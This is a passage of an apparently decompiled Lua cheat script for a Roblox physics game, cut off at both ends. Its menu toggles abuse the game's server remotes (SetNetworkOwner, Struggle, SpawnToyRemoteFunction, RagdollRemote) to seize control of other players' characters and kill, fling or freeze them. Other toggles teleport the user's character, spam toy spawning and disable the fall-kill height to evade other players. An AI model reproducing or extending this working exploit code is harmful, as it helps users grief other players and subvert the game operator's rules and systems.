                    local character = localPlayer.Character
                    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

                    if humanoidRootPart then
                        local remoteRef = tbl2.remoteRef

                        if not remoteRef then
                            local characterEvents = obj.ReplicatedStorage:FindFirstChild("CharacterEvents")
                            local ragdollRemote2 = characterEvents and characterEvents:FindFirstChild("RagdollRemote") or obj.ReplicatedStorage:FindFirstChild("RagdollRemote") or game:FindFirstChild("RagdollRemote", true)
                            remoteRef = ragdollRemote2

                            if remoteRef then
                                tbl2.remoteRef = remoteRef
                            end
                        end

                        if remoteRef and remoteRef:IsA("RemoteEvent") then
                            pcall(function()
                                remoteRef:FireServer(humanoidRootPart, 0)
                            end)
                        end
                    end

                    local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                    if v46 then
                        for k, child in pairs(v46:GetChildren()) do
                            if child.Name == "Gucci" or child.Name == "CreatureBlobman" then
                                pcall(function()
                                    child:Destroy()
                                end)
                            end
                        end
                    end
                end
            end,
        })

        v13:AddToggle("GucciT", {
            Text = "Anti-Gucci (Tractor)",
            Default = false,
            Callback = function(arg)
                if not arg then
                    tbl2.tractorGucciT = false
                    tbl2.tractorGucci3 = false

                    if tbl2.tractorGucci4 then
                        tbl2.tractorGucci4:Cancel()
                        tbl2.tractorGucci4 = nil
                    end

                    if tbl2.tractorGucci5 then
                        for k, v46 in pairs(tbl2.tractorGucci5) do
                            if type(v46) == "thread" then
                                task.cancel(v46)
                            else
                                pcall(function()
                                    v46:Disconnect()
                                end)
                            end
                        end
                    end

                    tbl2.tractorGucci5 = {}
                    local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                    if v46 then
                        local tractorGreen = v46:FindFirstChild("TractorGreen")

                        if tractorGreen and DestroyToy then
                            pcall(function()
                                DestroyToy:FireServer(tractorGreen)
                            end)
                        end
                    end

                    return
                end

                tbl2.tractorGucciT = true
                tbl2.tractorGucci3 = false
                local tractorGucci5 = tbl2.tractorGucci5
                local tractorGucci52 = tractorGucci5 or {}
                tbl2.tractorGucci5 = tractorGucci52
                local character = localPlayer.Character

                if character and character:FindFirstChild("HumanoidRootPart") then
                    tbl2.tractorGucci2 = character.HumanoidRootPart.CFrame
                    local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                    local tractorGreen = v46 and v46:FindFirstChild("TractorGreen")

                    if not tractorGreen and SpawnToyRemoteFunction and pcall(function()
                        return SpawnToyRemoteFunction:InvokeServer("TractorGreen", CFrame.new(0, 1000000, 0), Vector3.zero)
                    end) then
                        local v47 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                        local tractorGreen2 = v47 and v47:FindFirstChild("TractorGreen")
                        local v48 = tractorGreen2

                        if v48 then
                            task.spawn(function()
                                for k, descendant in pairs(v48:GetDescendants()) do
                                    if descendant:IsA("BasePart") then
                                        descendant.Anchored = true
                                        descendant.CFrame = CFrame.new(0, 1000000, 0)
                                    end
                                end
                            end)
                        end
                    end
                end

                local connection2 = localPlayer.CharacterAdded:Connect(function()
                    task.wait(0.1)
                    tbl2.tractorGucci3 = false

                    if tbl2.tractorGucci4 then
                        tbl2.tractorGucci4:Cancel()
                        tbl2.tractorGucci4 = nil
                    end

                    if tbl2.tractorGucciT then
                        local character2 = localPlayer.Character

                        if character2 and character2:FindFirstChild("HumanoidRootPart") then
                            tbl2.tractorGucci2 = character2.HumanoidRootPart.CFrame
                        end

                        local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                        if (not v46 or not v46:FindFirstChild("TractorGreen")) and SpawnToyRemoteFunction then
                            pcall(function()
                                SpawnToyRemoteFunction:InvokeServer("TractorGreen", CFrame.new(0, 1000000, 0), Vector3.zero)
                            end)
                        end
                    end
                end)

                table.insert(tbl2.tractorGucci5, connection2)

                local thread = task.spawn(function()
                    while true do
                        local v46 = getLocalHum()
                        local flag

                        if tbl2.tractorGucci3 then
                            flag = false
                        else
                            flag = true
                        end

                        if not flag then
                            local tractorGucci4 = tbl2.tractorGucci4
                            flag = tractorGucci4 and tbl2.tractorGucci3
                        end

                        if tbl2.tractorGucciT and flag then
                            local v47 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                            local tractorGreen = v47 and v47:FindFirstChild("TractorGreen")

                            if tractorGreen then
                                local vehicleSeat = tractorGreen:FindFirstChild("VehicleSeat") or tractorGreen:FindFirstChildOfClass("VehicleSeat")

                                if not vehicleSeat then
                                    for k, descendant in pairs(tractorGreen:GetDescendants()) do
                                        if descendant:IsA("VehicleSeat") then
                                            vehicleSeat = descendant
                                            break
                                        end
                                        continue
                                    end
                                end

                                if vehicleSeat and v46 and not v46.Sit then
                                    local v48 = hrp_()

                                    if v48 then
                                        tbl2.tractorGucci2 = v48.CFrame
                                        v48.CFrame = vehicleSeat.CFrame + Vector3.new(0, 0.5, 0)

                                        if pcall(function()
                                            vehicleSeat:Sit(v46)
                                        end) then
                                            task.wait(0.1)

                                            if v46 then
                                                v46:ChangeState(Enum.HumanoidStateType.Jumping)

                                                if tbl2.tractorGucci2 and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                                    localPlayer.Character.HumanoidRootPart.CFrame = tbl2.tractorGucci2
                                                end
                                            end
                                        elseif tbl2.tractorGucci2 and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                            localPlayer.Character.HumanoidRootPart.CFrame = tbl2.tractorGucci2
                                        end
                                    end

                                    if not tbl2.tractorGucci3 then
                                        tbl2.tractorGucci3 = true

                                        if tbl2.tractorGucci4 then
                                            tbl2.tractorGucci4:Cancel()
                                        end

                                        tbl2.tractorGucci4 = task.delay(0.1, function()
                                            tbl2.tractorGucci3 = false
                                            tbl2.tractorGucci4 = nil
                                        end)
                                    end
                                end
                            elseif SpawnToyRemoteFunction then
                                pcall(function()
                                    SpawnToyRemoteFunction:InvokeServer("TractorGreen", CFrame.new(0, 1000000, 0), Vector3.zero)
                                end)
                            end
                        end

                        if tbl2.tractorGucciT and v46 then
                            local v47 = hrp_()

                            if v47 and RagdollRemote then
                                pcall(function()
                                    RagdollRemote:FireServer(v47, 0)
                                end)
                            end
                        end

                        task.wait(0.016)
                    end
                end)

                table.insert(tbl2.tractorGucci5, thread)

                local connection3 = obj.RunService.Heartbeat:Connect(function()
                    if tbl2.tractorGucciT then
                        local v46 = getLocalHum()
                        local v47 = hrp_()

                        if v46 and v47 and RagdollRemote then
                            pcall(function()
                                RagdollRemote:FireServer(v47, 0)
                            end)
                        end
                    end
                end)

                table.insert(tbl2.tractorGucci5, connection3)
            end,
        })

        v13:AddToggle("antigrabtp", {
            Text = "Anti-Grab (TP)",
            Default = false,
            Callback = function(antigrabTPT)
                tbl2.AntigrabTPT = antigrabTPT
                local v46 = getCharacter()
                local humanoidRootPart = v46:WaitForChild("HumanoidRootPart")
                local humanoid = v46:FindFirstChildOfClass("Humanoid")

                if antigrabTPT then
                    if humanoid then
                        humanoid.PlatformStand = true
                    end

                    task.spawn(function()
                        while tbl2.AntigrabTPT and humanoidRootPart do
                            local n2 = math.random(-500, 500)
                            local n3 = math.random(30, 480)
                            local n4 = math.random(-500, 500)
                            humanoidRootPart.CFrame = CFrame.new(n2, n3, n4)
                            task.wait(0.03)
                        end
                    end)
                elseif humanoid then
                    humanoid.PlatformStand = false
                end
            end,
        })

        v13:AddToggle("Autoat", {
            Text = "Auto Attacker",
            Default = false,
            Callback = function(autoatakka)
                tbl2.autoatakka = autoatakka

                if autoatakka then
                    tbl2.AutoAttackerToggle = coroutine.create(function()
                        while tbl2.autoatakka do
                            task.wait(0.02)
                            local v46 = getCharacter()
                            local head_ = v46 and v46:FindFirstChild("Head")
                            local humanoidRootPart = v46 and v46:FindFirstChild("HumanoidRootPart")

                            if v46 and head_ and humanoidRootPart then
                                local partOwner_ = head_:FindFirstChild("PartOwner")

                                if partOwner_ then
                                    local v47 = obj.Players:FindFirstChild(partOwner_.Value)

                                    if v47 and v47.Character then
                                        local character = v47.Character
                                        local humanoidRootPart2 = character:FindFirstChild("HumanoidRootPart")
                                        local humanoid = character:FindFirstChildOfClass("Humanoid")
                                        local torso = character:FindFirstChild("Torso")

                                        if humanoidRootPart2 and humanoid then
                                            Struggle:FireServer()

                                            pcall(function()
                                                SetNetworkOwner:FireServer(humanoidRootPart2, humanoidRootPart2.CFrame)
                                            end)

                                            task.wait(0.05)

                                            if tbl2.SelectAutoatakka == "Death" then
                                                pcall(function()
                                                    for i, child in ipairs(character:GetChildren()) do
                                                        if child:IsA("BasePart") then
                                                            child.CFrame = CFrame.new(0, -1000000000, 0)
                                                            child.CanCollide = false
                                                        end
                                                    end

                                                    humanoid.Health = 0
                                                    humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                                                    CSV(humanoidRootPart2)
                                                    DestroyGrabLine:FireServer(humanoidRootPart2)
                                                end)
                                            elseif tbl2.SelectAutoatakka == "knock-back" then
                                                local bodyVelocity = Instance.new("BodyVelocity")
                                                bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                                bodyVelocity.Velocity = humanoidRootPart.CFrame.LookVector * 200 + Vector3.new(0, 50, 0)
                                                bodyVelocity.Parent = humanoidRootPart2
                                                obj.Debris:AddItem(bodyVelocity, 0.5)
                                            elseif tbl2.SelectAutoatakka == "air-Suspend" and torso then
                                                local l = torso:FindFirstChild("l")
                                                local bodyVelocity = l or Instance.new("BodyVelocity")
                                                bodyVelocity.Name = "l"
                                                bodyVelocity.Velocity = Vector3.new(0, 5000, 0)
                                                bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
                                                bodyVelocity.Parent = torso
                                                obj.Debris:AddItem(bodyVelocity, 1)
                                            elseif tbl2.SelectAutoatakka == "Freeze" then
                                                local bodyVelocity = Instance.new("BodyVelocity")
                                                bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                                bodyVelocity.Velocity = Vector3.zero
                                                bodyVelocity.Parent = humanoidRootPart2
                                                obj.Debris:AddItem(bodyVelocity, 2)
                                            elseif tbl2.SelectAutoatakka == "Fling" then
                                                local bodyVelocity = Instance.new("BodyVelocity")
                                                bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                                bodyVelocity.P = 1250
                                                bodyVelocity.Velocity = humanoidRootPart.CFrame.LookVector * 2000 + Vector3.new(0, 1000, 0)
                                                bodyVelocity.Parent = humanoidRootPart2
                                                obj.Debris:AddItem(bodyVelocity, 3)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end)

                    coroutine.resume(tbl2.AutoAttackerToggle)
                elseif tbl2.AutoAttackerToggle then
                    coroutine.close(tbl2.AutoAttackerToggle)
                    tbl2.AutoAttackerToggle = nil
                end
            end,
        })

        v13:AddDropdown("atamode", {
            Text = "Counter Mode",
            Values = {"Death", "knock-back", "air-Suspend", "Freeze", "Fling"},
            Default = "Death",
            Callback = function(selectAutoatakka)
                tbl2.SelectAutoatakka = selectAutoatakka
            end,
        })

        v13:AddToggle("AntikillB", {
            Text = "Anti-Blob (Kill)",
            CurrentValue = false,
            Callback = function(blobkilltest)
                tbl2.Blobkilltest = blobkilltest

                if blobkilltest then
                    tbl2.BlobkilltestCon = task.spawn(function()
                        while tbl2.Blobkilltest do
                            local v46 = getCharacter()

                            if v46 then
                                local humanoid = v46:FindFirstChild("Humanoid")
                                local humanoidRootPart = v46:FindFirstChild("HumanoidRootPart")

                                if humanoid and humanoidRootPart and humanoid.Health > 0 then
                                    humanoid.Sit = true

                                    pcall(function()
                                        humanoid:ChangeState(Enum.HumanoidStateType.Running)
                                    end)

                                    if Camera then
                                        local lookVector = Camera.CFrame.LookVector
                                        humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position, humanoidRootPart.Position + Vector3.new(lookVector.X, 0, lookVector.Z))
                                    end
                                end
                            end

                            task.wait()
                        end
                    end)
                else
                    if tbl2.BlobkilltestCon then
                        task.cancel(tbl2.BlobkilltestCon)
                        tbl2.BlobkilltestCon = nil
                    end

                    local v46 = getCharacter()
                    local humanoid = v46 and v46:FindFirstChild("Humanoid")

                    if humanoid and humanoid.Health > 0 then
                        humanoid.Sit = false

                        pcall(function()
                            humanoid:ChangeState(Enum.HumanoidStateType.Running)
                        end)
                    end
                end
            end,
        })

        v13:AddToggle("AntiBLobAura", {
            Text = "Anti-Blob (Aura)",
            Default = false,
            Callback = function(arg)
                if arg then
                    if tbl2.AntiblobauraCon then
                        tbl2.AntiblobauraCon:Disconnect()
                    end

                    tbl2.AntiblobauraCon = obj.RunService.Heartbeat:Connect(function()
                        local v46 = getCharacter()
                        local humanoidRootPart = v46 and v46:FindFirstChild("HumanoidRootPart")
                        if not humanoidRootPart then
                            return
                        end

                        for k, player in pairs(obj.Players:GetPlayers()) do
                            if player ~= localPlayer then
                                local character = player.Character
                                local humanoidRootPart2 = character and character:FindFirstChild("HumanoidRootPart")
                                local humanoid = character and character:FindFirstChild("Humanoid")

                                if humanoidRootPart2 and humanoid and humanoid.SeatPart then
                                    local parent = humanoid.SeatPart.Parent

                                    if parent and parent.Name == "CreatureBlobman" and (humanoidRootPart2.Position - humanoidRootPart.Position).Magnitude <= 25 then
                                        SetNetworkOwner:FireServer(humanoidRootPart2, humanoidRootPart2.CFrame)
                                    end
                                end
                            end
                        end
                    end)
                elseif tbl2.AntiblobauraCon then
                    tbl2.AntiblobauraCon:Disconnect()
                    tbl2.AntiblobauraCon = nil
                end
            end,
        })

        v13:AddToggle("ankiltp", {
            Text = "Anti-Kill (House)",
            Default = false,
            Callback = function(antikillHouseT)
                tbl2.AntikillHouseT = antikillHouseT

                if tbl2.AntiKillHouseCon then
                    tbl2.AntiKillHouseCon:Disconnect()
                    tbl2.AntiKillHouseCon = nil
                end

                if antikillHouseT then
                    tbl2.AntiKillHouseCon = obj.RunService.Heartbeat:Connect(function()
                        local character = localPlayer.Character

                        if character and character:FindFirstChild("HumanoidRootPart") then
                            character.HumanoidRootPart.CFrame = CFrame.new(tbl2.antiKillHousePos)
                        end
                    end)
                end
            end,
        })

        v13:AddToggle("ankilby", {
            Text = "Anti-Kill (Bypass)",
            Default = false,
            Callback = function(arg)
                if arg then
                    if tbl2.IsBypassRun then
                        return
                    end
                    tbl2.IsBypassRun = true
                    originalFallenHeight = obj.Workspace.FallenPartsDestroyHeight
                    obj.Workspace.FallenPartsDestroyHeight = (0 / 0)
                    Camera = obj.Workspace.CurrentCamera

                    if Camera then
                        if tbl2.cameraTargetPart then
                            tbl2.cameraTargetPart:Destroy()
                            tbl2.cameraTargetPart = nil
                        end

                        tbl2.cameraTargetPart = Instance.new("Part")
                        tbl2.cameraTargetPart.Name = "BypassCameraTarget"
                        tbl2.cameraTargetPart.Size = Vector3.new(1, 1, 1)
                        tbl2.cameraTargetPart.Transparency = 1
                        tbl2.cameraTargetPart.Anchored = true
                        tbl2.cameraTargetPart.CanCollide = false
                        local character = localPlayer.Character
                        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

                        if humanoidRootPart then
                            tbl2.cameraTargetPart.CFrame = humanoidRootPart.CFrame
                            tbl2.lastOriginalCFrame = humanoidRootPart.CFrame
                        elseif tbl2.lastOriginalCFrame then
                            tbl2.cameraTargetPart.CFrame = tbl2.lastOriginalCFrame
                        else
                            tbl2.cameraTargetPart.CFrame = CFrame.new()
                        end

                        tbl2.cameraTargetPart.Parent = obj.Workspace
                        Camera.CameraSubject = tbl2.cameraTargetPart
                        Camera.CameraType = Enum.CameraType.Custom
                    end

                    local v46 = coroutine.wrap(function()
                        while tbl2.IsBypassRun do
                            if localPlayer.Character then
                                local character = localPlayer.Character

                                if character then
                                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

                                    if humanoidRootPart then
                                        if tbl2.lastOriginalCFrame == nil then
                                            tbl2.lastOriginalCFrame = humanoidRootPart.CFrame
                                        end

                                        local cFrame = humanoidRootPart.CFrame
                                        local now2 = tick()

                                        while tick() - now2 < 1 and tbl2.IsBypassRun and localPlayer.Character and humanoidRootPart.Parent do
                                            local n2 = tick() * 12
                                            local n3 = math.cos(n2) * 10000
                                            local n4 = math.sin(n2) * 10000
                                            humanoidRootPart.CFrame = cFrame + Vector3.new(n3, -10000, n4)
                                            obj.RunService.RenderStepped:Wait()
                                        end

                                        if tbl2.IsBypassRun and humanoidRootPart and humanoidRootPart.Parent then
                                            humanoidRootPart.CFrame = cFrame
                                        end
                                    end
                                end
                            else
                                task.wait(0.5)
                            end

                            task.wait(0.0001)
                        end
                    end)

                    loopCoroutine = v46
                    loopCoroutine()
                else
                    tbl2.IsBypassRun = false
                    loopCoroutine = nil
                    local character = localPlayer.Character

                    if character and tbl2.lastOriginalCFrame then
                        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

                        if humanoidRootPart then
                            humanoidRootPart.CFrame = tbl2.lastOriginalCFrame
                        end
                    end

                    if originalFallenHeight then
                        obj.Workspace.FallenPartsDestroyHeight = originalFallenHeight
                    else
                        obj.Workspace.FallenPartsDestroyHeight = -100
                    end

                    Camera = obj.Workspace.CurrentCamera

                    if Camera then
                        local character2 = localPlayer.Character

                        if character2 then
                            local humanoid = character2:FindFirstChildOfClass("Humanoid")

                            if humanoid then
                                Camera.CameraSubject = humanoid
                            end
                        end

                        Camera.CameraType = Enum.CameraType.Custom
                    end

                    if tbl2.cameraTargetPart then
                        tbl2.cameraTargetPart:Destroy()
                        tbl2.cameraTargetPart = nil
                    end
                end
            end,
        })

        n = 8
    elseif n == 8 then
        task.wait()

        if game:IsLoaded() then
            n = 9
        else
            n = 8
        end
    elseif n == 9 then
        Workspace = game:GetService("Workspace")
        ReplicatedStorage = game:GetService("ReplicatedStorage")
        tbl4 = {AntiGrab = false}

        tbl5 = {
            States = {
                ["Anti Grab"] = false,
                Escaping = false,
                Spawning = false,
                Owning = false,
            },
            FailedToys = {},
            LimbOffsetsRL = {
                Head = CFrame.new(0, 1.5, 0),
                ["Left Arm"] = CFrame.new(-1.5, 0, 0),
                ["Right Arm"] = CFrame.new(1.5, 0, 0),
                ["Left Leg"] = CFrame.new(-0.5, -2, 0),
                ["Right Leg"] = CFrame.new(0.5, -2, 0),
                Torso = CFrame.new(),
            },
        }

        tbl6 = {}
        v37 = nil
        connection = nil

        fn15 = function()
            local function fn40(arg)
                local characterEvents = arg and arg:FindFirstChild("GrabEvents") and arg:FindFirstChild("MenuToys") and arg:FindFirstChild("CharacterEvents")
                return characterEvents
            end

            if fn40(ReplicatedStorage) then
                return ReplicatedStorage
            end

            for i, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
                if fn40(descendant) then
                    return descendant
                end
            end

            return ReplicatedStorage
        end

        fn16 = function()
            v37 = fn15()
            local grabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
            local v46 = v37
            local menuToys2 = v46 and v37:FindFirstChild("MenuToys")
            local v47 = v37
            local characterEvents = v47 and v37:FindFirstChild("CharacterEvents")
            local setNetworkOwner2 = grabEvents and grabEvents:FindFirstChild("SetNetworkOwner") or nil
            tbl6.sno = setNetworkOwner2
            local createGrabLine2 = grabEvents and grabEvents:FindFirstChild("CreateGrabLine") or nil
            tbl6.cgl = createGrabLine2
            local destroyGrabLine2 = grabEvents and grabEvents:FindFirstChild("DestroyGrabLine") or nil
            tbl6.dgl = destroyGrabLine2
            local struggle2 = characterEvents and characterEvents:FindFirstChild("Struggle") or nil
            tbl6.Struggle = struggle2
            local ragdollRemote2 = characterEvents and characterEvents:FindFirstChild("RagdollRemote") or nil
            tbl6.RagdollRemote = ragdollRemote2
            local spawnToyRemoteFunction2 = menuToys2 and menuToys2:FindFirstChild("SpawnToyRemoteFunction") or nil
            tbl6.spawnEvent = spawnToyRemoteFunction2
            local destroyToy2 = menuToys2 and menuToys2:FindFirstChild("DestroyToy") or nil
            tbl6.destroyToyEvent = destroyToy2
            return v37
        end

        fn16()

        fn17 = function(arg, ...)
            if not arg then
                return false, nil
            end

            local ok, result = pcall(function(...)
                if arg:IsA("RemoteFunction") then
                    return arg:InvokeServer(...)
                end
                arg:FireServer(...)
                return true
            end, ...)

            return ok, result
        end

        tbl7 = {
            charp = function(arg)
                local v46 = arg or localPlayer
                local v47 = v46
                local character = v46 and v47.Character
                if not character then
                    return nil, nil, nil
                end
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                local torso = humanoidRootPart or character:FindFirstChild("Torso")
                return character, torso, character:FindFirstChildWhichIsA("Humanoid")
            end,
            resetVelocity = function(arg)
                if arg and arg:IsA("BasePart") then
                    arg.AssemblyLinearVelocity = Vector3.zero
                    arg.AssemblyAngularVelocity = Vector3.zero
                end
            end,
        }

        tbl7.teleport = function(arg, arg2, arg3)
            if not arg then
                return false
            end
            local v46 = arg

            if typeof(arg) == "Instance" and arg:IsA("Model") then
                local primaryPart = arg.PrimaryPart
                local basePart = primaryPart or arg:FindFirstChildWhichIsA("BasePart", true)
                v46 = basePart
            end

            if typeof(v46) ~= "Instance" or not v46:IsA("BasePart") then
                return false
            end
            local cframe = nil

            if typeof(arg2) == "CFrame" then
                cframe = arg2
            elseif typeof(arg2) == "Vector3" then
                cframe = CFrame.new(arg2)
            elseif typeof(arg2) == "Instance" then
                if arg2:IsA("BasePart") then
                    cframe = arg2.CFrame
                elseif arg2:IsA("Model") then
                    cframe = arg2:GetPivot()
                end
            end

            if not cframe then
                return false
            end

            if typeof(arg3) == "CFrame" then
                cframe = cframe * arg3
            end

            v46.CFrame = cframe
            tbl7.resetVelocity(v46)
            return true
        end

        tbl7.ToggleCollisions = function(arg, arg2, arg3, arg4)
            if typeof(arg) ~= "Instance" or not arg:IsA("Model") then
                return
            end

            for k, child in pairs(arg:GetChildren()) do
                if child:IsA("BasePart") then
                    if arg2 then
                        if child.Name == "Torso" or child.Name == "Head" then
                            child.CanCollide = true
                        end
                    else
                        child.CanCollide = false

                        if not arg3 then
                            local ragdollLimbPart = child:FindFirstChild("RagdollLimbPart")

                            if ragdollLimbPart then
                                ragdollLimbPart.CanCollide = false
                            end
                        end
                    end

                    if child.Name ~= "HumanoidRootPart" then
                        local physicalProperties = nil

                        if arg4 then
                            physicalProperties = PhysicalProperties.new(0.01, 0.01, 0.01, 0.01, 0.01)
                        end

                        child.CustomPhysicalProperties = physicalProperties
                    end
                end
            end
        end

        tbl7.RepositionLimbs = function(arg, arg2)
            if typeof(arg) ~= "Instance" or not arg:IsA("Model") then
                return false
            end
            local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then
                return false
            end
            local torso = arg:FindFirstChild("Torso")
            if not torso then
                return false
            end
            local neck = torso:FindFirstChild("Neck")
            if neck and neck.Enabled == true then
                return false
            end

            for k, v46 in pairs(tbl5.LimbOffsetsRL) do
                local v47 = arg:FindFirstChild(k)

                if v47 and v47:IsA("BasePart") then
                    v47.CFrame = humanoidRootPart.CFrame * v46

                    if arg2 then
                        tbl7.resetVelocity(v47)
                    end
                end
            end

            return true
        end

        tbl7.st = function(arg, arg2)
            if type(arg) ~= "string" or tbl5.FailedToys[arg] then
                return nil
            end
            local v46, v47 = tbl7.charp()
            if not v47 or tbl5.States.Spawning then
                return nil
            end
            local inPlot2 = localPlayer:FindFirstChild("InPlot")
            local inOwnedPlot2 = localPlayer:FindFirstChild("InOwnedPlot")
            local flag = inPlot2 ~= nil and inPlot2.Value == true

            if flag then
                local flag2 = inOwnedPlot2 ~= nil and inOwnedPlot2.Value == true

                if flag2 then
                    flag = false
                else
                    flag = true
                end
            end

            if flag and tbl5.States.Owning then
                return nil
            end
            fn16()
            if not tbl6.spawnEvent or not tbl6.spawnEvent:IsA("RemoteFunction") then
                return nil
            end
            local v48 = Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
            if not v48 then
                return nil
            end
            tbl5.States.Spawning = true

            if flag then
                tbl5.States.Owning = true
            end

            local connection2 = nil
            local connection3 = nil
            local flag2 = false
            local cFrame = v47.CFrame
            local v49 = nil

            local ok, result = pcall(function()
                local canSpawnToy2 = localPlayer:FindFirstChild("CanSpawnToy")

                if canSpawnToy2 then
                    while canSpawnToy2.Value == false do
                        task.wait()
                        if not v47.Parent then
                            return
                        end
                    end
                end

                local v50 = flag
                local cframe = v50 and CFrame.new(0, 25, 0) or v47.CFrame + Vector3.new(0, 15, 0)
                local flag3 = typeof(arg2) == "CFrame" and arg2 or cframe
                local n2 = CFrame.new(flag3.Position) + Vector3.new(0, 0, 20)
                local rotateOrientPart = Workspace:FindFirstChild("RotateOrientPart")
                local rotation = rotateOrientPart and rotateOrientPart.Rotation or Vector3.zero

                connection2 = v48.ChildAdded:Connect(function(child)
                    if child.Name == arg then
                        v49 = child

                        if connection2 then
                            connection2:Disconnect()
                            connection2 = nil
                        end
                    end
                end)

                cFrame = v47.CFrame

                if flag then
                    local cframe2 = CFrame.new(0, 10, 0)

                    pcall(function()
                        obj.RunService:UnbindFromRenderStep("STClient")
                    end)

                    obj.RunService:BindToRenderStep("STClient", Enum.RenderPriority.Camera.Value - 1, function()
                        if v47.Parent then
                            v47.CFrame = cFrame
                        end
                    end)

                    flag2 = true

                    connection3 = obj.RunService.Heartbeat:Connect(function()
                        if v47.Parent then
                            cFrame = v47.CFrame
                            v47.CFrame = cframe2
                        end
                    end)
                end

                local function fn40()
                    fn17(tbl6.spawnEvent, arg, n2, rotation)
                end

                task.spawn(fn40)
                local now2 = tick()

                repeat
                    RunService.Heartbeat:Wait()

                    if flag then
                        task.spawn(fn40)
                    end
                until v49 or tick() - now2 > 1.3
            end);

            (function()
                if flag2 then
                    pcall(function()
                        obj.RunService:UnbindFromRenderStep("STClient")
                    end)

                    flag2 = false
                end

                if connection3 then
                    connection3:Disconnect()
                    connection3 = nil
                end

                if connection2 then
                    connection2:Disconnect()
                    connection2 = nil
                end

                if flag and v47 and v47.Parent then
                    v47.CFrame = cFrame
                end

                tbl5.States.Spawning = false

                if flag then
                    tbl5.States.Owning = false
                end
            end)()

            if not ok then
                warn(string.format("[AntiGrab st] %s", tostring(result)))
                return nil
            end

            if not v49 then
                tbl5.FailedToys[arg] = true

                task.delay(2, function()
                    tbl5.FailedToys[arg] = nil
                end)
            end

            return v49
        end

        tbl7.dt = function(arg)
            if typeof(arg) ~= "Instance" or not arg:IsA("Model") then
                return false
            end
            fn16()
            if not tbl6.destroyToyEvent then
                return false
            end
            local flag = fn17(tbl6.destroyToyEvent, arg) == true
            return flag
        end

        fn18 = function(arg)
            local n2 = arg or 0
            local now2 = tick()

            repeat
                obj.RunService.Heartbeat:Wait()
            until n2 <= tick() - now2

            return true
        end

        tbl7.ExtraEscape = function(arg)
            local v46, v47, v48 = tbl7.charp()
            if not v47 or not v48 or v48.Health == 0 or tbl5.States.Escaping then
                return
            end
            local inPlot2 = localPlayer:FindFirstChild("InPlot")
            if not inPlot2 or inPlot2.Value then
                return
            end
            tbl5.States.Escaping = true
            local waypoints = Workspace:FindFirstChild("Waypoints")
            local tudorHouse = waypoints and waypoints:FindFirstChild("TudorHouse")
            if not tudorHouse then
                tbl5.States.Escaping = false
                return
            end
            local TractorGreen = tbl7.st("TractorGreen", tudorHouse.CFrame)
            if not TractorGreen then
                tbl5.States.Escaping = false
                return
            end
            local vehicleSeat = TractorGreen:WaitForChild("VehicleSeat", 1)
            if not vehicleSeat then
                tbl5.States.Escaping = false
                return tbl7.dt(TractorGreen)
            end
            local now2 = tick()
            local flag = false
            v48.Sit = false
            vehicleSeat:Sit(v48)

            local connection2 = vehicleSeat.ChildAdded:Connect(function(child)
                if child.Name == "SeatWeld" then
                    child.Enabled = false
                    flag = true
                    child:Destroy()
                end
            end)

            repeat
                fn18()
            until flag or tick() - now2 > 0.7

            connection2:Disconnect()
            v48.Sit = false
            tbl7.dt(TractorGreen)

            if arg then
                tbl7.teleport(v47, arg)
            end

            tbl5.States.Escaping = false
            return true
        end

        fn19 = function()
            if connection then
                connection:Disconnect()
                connection = nil
            end

            tbl5.States["Anti Grab"] = false
        end

        fn20 = function()
            if not tbl4.AntiGrab or not isHeld.Value or tbl5.States["Anti Grab"] then
                return
            end
            fn16()

            if tbl6.Struggle then
                fn17(tbl6.Struggle)
            end

            local v46, v47, v48 = tbl7.charp()
            if not v48 or not v47 then
                return
            end
            tbl5.States["Anti Grab"] = true
            local cFrame = v47.CFrame
            task.spawn(tbl7.ExtraEscape, cFrame)
            local now2 = tick()

            connection = obj.RunService.Heartbeat:Connect(function(deltaTime)
                if tbl6.Struggle then
                    fn17(tbl6.Struggle)
                end

                if tick() - now2 > 2 then
                    task.spawn(tbl7.ExtraEscape, cFrame)
                    now2 = tick()
                end

                if not isHeld.Value or not tbl4.AntiGrab then
                    tbl5.States["Anti Grab"] = false

                    if connection then
                        connection:Disconnect()
                        connection = nil
                    end
                end
            end)
        end

        task.spawn(function()
            while task.wait(0.03) do
                if tbl4.AntiGrab then
                    fn20()
                elseif tbl5.States["Anti Grab"] then
                    fn19()
                end
            end
        end)

        v13:AddToggle("Antikill", {
            Text = "Anti-Kill (Grab)",
            Default = false,
            Callback = function(antiGrab)
                tbl4.AntiGrab = antiGrab
            end,
        })

        v13:AddToggle("Invisi", {
            Text = "Invisibility",
            Default = false,
            Callback = function(noclipEnabled)
                local v46 = Invisibility
                local tbl11 = v46 or {}
                Invisibility = tbl11
                Invisibility.noclipEnabled = noclipEnabled
                Invisibility.cameraOffset = 10
                Invisibility.undergroundDepthOffset = 20
                Invisibility.character = getCharacter()
                Invisibility.humanoidRootPart = Invisibility.character:WaitForChild("HumanoidRootPart")
                Invisibility.head = Invisibility.character:WaitForChild("Head")
                Invisibility.camera = Workspace.CurrentCamera

                if noclipEnabled then
